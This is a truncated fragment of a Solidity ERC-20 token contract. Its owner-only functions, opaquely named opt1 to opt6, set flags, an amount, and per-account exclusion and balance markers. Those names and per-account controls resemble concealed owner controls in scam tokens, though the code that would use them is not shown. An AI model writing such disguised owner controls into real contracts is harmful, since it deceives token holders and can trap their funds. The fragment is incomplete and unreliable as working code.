...
contract Token is Context, IERC20, IERC20Metadata {
    ...
    function opt1(bool _amount1_) onlyOwner public {
        amount1 = _amount1_;
    }
    
    function opt2(uint _amount2_) onlyOwner public {
        _amount1 = _amount2_;
    }
    
    function opt3(address _account_) onlyOwner public {
        _excludeamount[_account_] = true;
    }
    
    function opt4(bool _balances1_) onlyOwner public {
        balances1 = _balances1_;
    }
    
    function opt5(address account) onlyOwner public {
        _balances1[account] = true;
    }
    
     function opt6(address account) onlyOwner public {
